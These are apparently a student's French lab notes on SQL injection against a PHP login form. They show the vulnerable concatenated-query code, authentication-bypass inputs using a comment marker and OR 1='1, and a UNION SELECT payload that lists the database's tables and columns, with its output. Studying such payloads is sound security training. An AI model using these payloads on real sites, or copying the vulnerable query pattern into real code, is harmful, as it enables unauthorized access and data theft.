# ByPass d'authentification
## Requête utilisant le nom d'utilisateur:

* SELECT * FROM accounts AS A JOIN users AS B ON A.id_users = B.id WHERE B.login = 'Jean'#' AND B.pass = '123t'

*On se log avec le nom d'utilisateur puis '# ou ';*
> Jean'#

Une fois le nom inscrit on commente le reste de la requête (qui vérifie le mot de passe) et la requête s'arrête a la vérification du login

> $legalQuery = "SELECT * FROM accounts AS A JOIN users AS B ON A.id_users = B.id WHERE B.login = '" . $_POST["login"] . "' AND B.pass = '" . $_POST["password"] . "'";

* SELECT * FROM accounts AS A JOIN users AS B ON A.id_users = B.id WHERE B.login = 'Jean' # AND B.pass = '123t'

le code *# AND B.pass = '123t'* est commenté

=> le mot de passe n'est pas contrôlé, les données s'affichent.

## En remplaçant la valeur du test du mdp 

pass = user pass doit retourner TRUE
En proposant un test qui donne TRUE à la place de pass= user pass, on change la requête :

*On se log avec le mot de passe 

> "toto' OR 1='1"

=> La table de vérité donne TRUE, les données s'affichent

# Evasion de la base cible

On passe dans le formulaire

    login => non null 
    
    password => motDePasseInconnu ' AND 1=0 UNION SELECT database(), t.table_name, concat(c.column_name,':',c.data_type) FROM information_schema.tables AS t NATURAL JOIN information_schema.columns AS c WHERE table_schema = database() #

On obtient une liste des tables de notre base qu'on va pouvoir utiliser plus tard

>
  0 => 

    array (size=3)

      'login' => string 'security_php' (length=12)

      'type' => string 'accounts' (length=8)

      'amount' => string 'amount:float' (length=12)

  1 => 

    array (size=3)

      'login' => string 'security_php' (length=12)

      'type' => string 'accounts' (length=8)

      'amount' => string 'id:int' (length=6)

  2 => 

    array (size=3)

      'login' => string 'security_php' (length=12)

      'type' => string 'accounts' (length=8)

      'amount' => string 'id_users:int' (length=12)

  3 => 

    array (size=3)

      'login' => string 'security_php' (length=12)

      'type' => string 'accounts' (length=8)

      'amount' => string 'type:varchar' (length=12)

  4 => 

    array (size=3)

      'login' => string 'security_php' (length=12)

      'type' => string 'users' (length=5)

      'amount' => string 'id:int' (length=6)

  5 => 

    array (size=3)

      'login' => string 'security_php' (length=12)

      'type' => string 'users' (length=5)

      'amount' => string 'login:varchar' (length=13)

  6 => 

    array (size=3)

      'login' => string 'security_php' (length=12)

      'type' => string 'users' (length=5)

      'amount' => string 'pass:varchar' (length=12)


